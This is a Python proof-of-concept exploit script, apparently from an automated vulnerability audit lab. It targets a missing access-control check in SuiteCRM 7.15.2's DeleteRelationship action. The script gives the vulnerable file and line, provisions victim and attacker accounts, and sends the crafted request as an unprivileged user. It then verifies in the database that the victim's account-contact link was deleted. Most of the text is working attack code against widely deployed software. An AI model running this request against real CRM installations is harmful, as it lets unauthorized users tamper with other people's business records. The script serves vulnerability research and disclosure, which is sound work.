#!/usr/bin/env python3
"""
VULN-022 -- DeleteRelationship: delete any relationship on any record
            (aclroles-only ACL copy-paste bug)

Target:   SuiteCRM 7.15.2 (targets/SuiteCRM/)
Sink:     include/generic/DeleteRelationship.php:96
              $focus->$linked_field->delete($record, $linked_id);
          The only ACL check in the file (ACLController::checkAccess(...,
          'edit', true), duplicated at :74-75 and :79-80) is gated behind
          `if ($linked_field === 'aclroles')` -- for every OTHER relationship
          name (e.g. 'contacts') there is NO authorization check at all.
Routing:  action_file_map.php:44 -> action=DeleteRelationship bypasses the
          module's own controller entirely (straight require, like Save2 /
          SubPanelViewer).

What this script does
----------------------
1. Logs in as admin, creates two fresh, UNRELATED low-priv users: victim V
   and attacker A.
2. As V: creates an Account and a Contact related to it (account_id set
   directly on the Contact save) -- both owned by V. A has no ACL grant, no
   Security-Group membership, and no relationship to either record.
3. Confirms via the DB that the accounts_contacts relationship row exists
   (not deleted) before the attack -- this is YOUR OWN seeded relationship,
   not a demo one (non-destructive discipline).
4. As A (zero relation to V's records): sends
   GET action=DeleteRelationship&module=Accounts&record=<V's account>&
       linked_field=contacts&linked_id=<V's contact>
5. Asserts the REAL effect: the accounts_contacts row for that exact
   (account_id, contact_id) pair is now deleted=1 in the database -- proving
   A tore down a relationship on a record A never had edit rights to.

Environment variables (defaults match claude_audit/SuiteCRM/SuiteCRM_summary.md):
    BASE_URL, ADMIN_USER, ADMIN_PASS, COMPOSE_PROJECT

Exit code 0 + "[OK]" on CONFIRMED, non-zero + "[FAIL]" otherwise.
"""
import os
import re
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict, admin_session, create_user, web_login)

VULN_ID = "VULN-022"
HERE = os.path.dirname(os.path.abspath(__file__))
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT", "cvehunterlab_suitecrm")


def save_evidence(request_txt, response_obj):
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(request_txt)
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"HTTP/1.1 {response_obj.status_code} {response_obj.reason}\n")
        for k, v in response_obj.headers.items():
            f.write(f"{k}: {v}\n")
        f.write("\n")
        f.write(response_obj.text[:10000])


def db_query(sql):
    r = subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, "exec", "-T", "db",
         "mysql", "-uroot", "-pSuiteRoot!2026x", "suitecrm", "-N", "-e", sql],
        capture_output=True, text=True, timeout=30,
    )
    return r.stdout.strip()


def main():
    banner(VULN_ID, "DeleteRelationship -- delete any relationship on any record (no ACL)")

    log("SETUP", "admin web login")
    admin = admin_session()

    log("SETUP", "provisioning victim (V) and attacker (A) -- fresh, unrelated low-priv users")
    victim = create_user(admin, "Victim022@2026x!")
    attacker = create_user(admin, "Attacker022@2026x!")
    log("INFO", f"victim   = {victim['user_name']} ({victim['id']})")
    log("INFO", f"attacker = {attacker['user_name']} ({attacker['id']})")

    vs = web_login(victim["user_name"], victim["password"])

    log("SETUP", "as V: create an Account")
    acct_name = rand("V022Acc")
    r = vs.post(f"{BASE_URL}/index.php", data={
        "module": "Accounts", "action": "Save", "record": "", "name": acct_name,
    }, headers={"Referer": f"{BASE_URL}/index.php?module=Accounts&action=EditView"},
        allow_redirects=False, timeout=30)
    m = re.search(r"record=([0-9a-fA-F-]{36})", r.headers.get("Location", ""))
    if not m:
        verdict(VULN_ID, "FAILED", f"could not create victim Account (status={r.status_code})")
        sys.exit(1)
    acct_id = m.group(1)
    log("OK", f"Account created: {acct_id} ({acct_name}), owned by V")

    log("SETUP", "as V: create a Contact related to that Account (account_id set directly)")
    contact_last = rand("V022Contact")
    r = vs.post(f"{BASE_URL}/index.php", data={
        "module": "Contacts", "action": "Save", "record": "",
        "first_name": "Victim022", "last_name": contact_last,
        "account_id": acct_id, "account_name": acct_name,
    }, headers={"Referer": f"{BASE_URL}/index.php?module=Contacts&action=EditView"},
        allow_redirects=False, timeout=30)
    m = re.search(r"record=([0-9a-fA-F-]{36})", r.headers.get("Location", ""))
    if not m:
        verdict(VULN_ID, "FAILED", f"could not create victim Contact (status={r.status_code})")
        sys.exit(1)
    contact_id = m.group(1)
    log("OK", f"Contact created: {contact_id} (last_name={contact_last}), related to the Account, owned by V")

    log("STEP", "confirm the seeded relationship row exists in the DB before the attack")
    before = db_query(
        f"SELECT id, deleted FROM accounts_contacts WHERE account_id='{acct_id}' "
        f"AND contact_id='{contact_id}';"
    )
    log("INFO", f"accounts_contacts row BEFORE attack: {before!r}")
    if not before or "\t0" not in before:
        verdict(VULN_ID, "FAILED", f"seeded relationship row not found/not active before attack: {before!r}")
        sys.exit(1)
    rel_id = before.split("\t")[0]

    log("STEP", "as A (zero relationship to V's Account/Contact): DeleteRelationship on V's Account")
    params = {
        "module": "Accounts", "action": "DeleteRelationship",
        "record": acct_id, "linked_field": "contacts", "linked_id": contact_id,
        "refresh_page": "1",  # avoid the handleRedirect() at the end, we just want the delete to run
    }
    request_txt = (
        f"GET /index.php?{'&'.join(f'{k}={v}' for k, v in params.items())} HTTP/1.1\n"
        f"Host: localhost:33116\n"
        f"Cookie: PHPSESSID=<attacker session>\n"
        f"Referer: {BASE_URL}/index.php?module=Accounts&action=DetailView&record={acct_id}\n\n"
        f"# Attacker A ({attacker['user_name']}) has never viewed, been assigned,\n"
        f"# or been related to Account {acct_id} or Contact {contact_id} (both owned by V).\n"
    )
    as_ = web_login(attacker["user_name"], attacker["password"])
    r2 = as_.get(f"{BASE_URL}/index.php", params=params, timeout=30,
                 headers={"Referer": f"{BASE_URL}/index.php?module=Accounts&action=DetailView&record={acct_id}"})
    save_evidence(request_txt, r2)
    log("INFO", f"attack response status={r2.status_code} len={len(r2.text)}")

    log("PROOF", "re-querying accounts_contacts row AFTER the attacker's DeleteRelationship")
    after = db_query(
        f"SELECT id, deleted, date_modified FROM accounts_contacts WHERE id='{rel_id}';"
    )
    with open(os.path.join(HERE, "evidence", "db_before_after.txt"), "w") as f:
        f.write(f"relationship id: {rel_id}\n\nBEFORE (attacker's request):\n{before}\n\nAFTER:\n{after}\n")
    log("PROOF", f"accounts_contacts row AFTER attack: {after!r}")

    deleted = after.endswith("\t1") or "\t1\t" in after
    if not deleted:
        verdict(VULN_ID, "FAILED", f"relationship row was not marked deleted by the attacker's request: {after!r}")
        sys.exit(1)

    log("OK", f"attacker A (no ACL, no relation to either record) deleted V's Account<->Contact relationship "
              f"(accounts_contacts.id={rel_id}, deleted 0 -> 1)")
    verdict(VULN_ID, "CONFIRMED",
            f"non-owner A deleted V's accounts_contacts relationship {rel_id} via DeleteRelationship, no ACL check")
    sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:  # noqa: BLE001
        log("FAIL", f"unhandled exception: {exc!r}")
        verdict(VULN_ID, "FAILED", f"unhandled exception: {exc}")
        sys.exit(1)
